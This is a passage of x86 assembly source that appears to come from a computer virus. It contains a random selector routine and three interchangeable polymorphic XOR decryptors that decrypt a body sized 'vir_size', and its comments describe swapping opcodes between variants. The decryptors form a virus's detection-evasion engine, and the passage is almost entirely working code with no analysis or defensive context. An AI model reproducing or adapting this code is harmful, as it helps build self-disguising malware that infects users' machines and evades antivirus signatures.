    dd size_p1
    dd size_p2+size_p1


decide_:
    push ecx
    push ebx
    mov ecx,3
    call rnd_
    dec eax
    xor edx,edx
    mov ecx,4
    mul ecx
    lea edx,dword ptr [ebp+offsets]
    add edx,eax
    mov edx,dword ptr [edx]
    lea ebx,dword ptr [ebp+poly_1]
    add ebx,edx
    xchg edx,ebx
    pop ebx
    pop ecx
ret

;polymorphic decryptors, size=8 double opcodes 
;each two opcodes will replace other from different poly_x

poly_1:
pop edx
nop
mov edx,dword ptr [edx]
nop
xor dword ptr [esp],edx
nop
mov ecx,vir_size
nop
mov esi,dword ptr[esp]
nop
@@:
xor dword ptr [esi],edx
nop
inc esi
nop
loop @b
nop
ret
nop
size_p1 = $- poly_1

poly_2:
mov edx,dword ptr [esp]
add esp,4

push dword ptr [edx]
pop edx

mov edi,esp
xor dword ptr [edi],edx

push vir_size
pop ecx

pop esi
push esi


@@:

mov edi,edx
xor dword ptr [esi],edi

add esi,1
nop

loop @b
nop

pop ebp
jmp ebp
size_p2 = $- poly_2


poly_3:
pop ecx
mov edx,ecx

mov ecx,dword ptr [edx];push dword ptr [edx]
mov edx,ecx

mov edi,esp
xor dword ptr [edi],edx

xor ecx,ecx
add ecx, vir_size

mov ebx,dword ptr [edi]
xchg ebx,esi


@@:

mov eax,edx
xor dword ptr [esi],eax

adc esi,1
cld

loop @b
xchg ecx,ecx

pop edx
jmp edx
size_p3 = $- poly_3

_end:

end Start
